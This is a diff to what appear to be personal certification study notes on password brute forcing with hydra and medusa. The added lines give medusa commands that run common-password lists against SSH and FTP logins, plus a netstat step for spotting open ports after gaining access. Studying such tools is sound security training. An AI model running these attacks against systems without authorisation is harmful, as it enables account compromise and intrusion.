@@ -1,4 +1,4 @@
-#CWES #bruteforce #hydra
+#CWES #bruteforce #hydra #medusa 
 
 **When to use brute forcing:**
 - When other methods of getting access are exhausted
@@ -98,9 +98,33 @@ Command format:
 medusa [target_options] [credential_options] -M module [module_options]
 ```
 
-- Can be used over FTP, HTTP, IMAP, MySQL, POP3, RDP, etc. 
+- Can be used over FTP, HTTP, IMAP, MySQL, POP3, RDP, ssh,etc. 
 
-Medusa can also do attacks in parallell: 
+SSH example:
+```shell
+medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+```
+- -t 3 defines 3 threads in parallel 
+
+FTP example:
+```shell
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+```
+
+Also, connecting to ftp:
+```shell
+ftp ftp://<user>:<password>@<ip>
+```
+
+NOTE: After gaining access to a system via ssh it can be useful to run:
+```shell
+netstat -tulpn | grep LISTEN
+```
+- This will show us potential open ports 
+
+
+
+Medusa can also do attacks in parallel: 
 ```shell
 medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
 ```
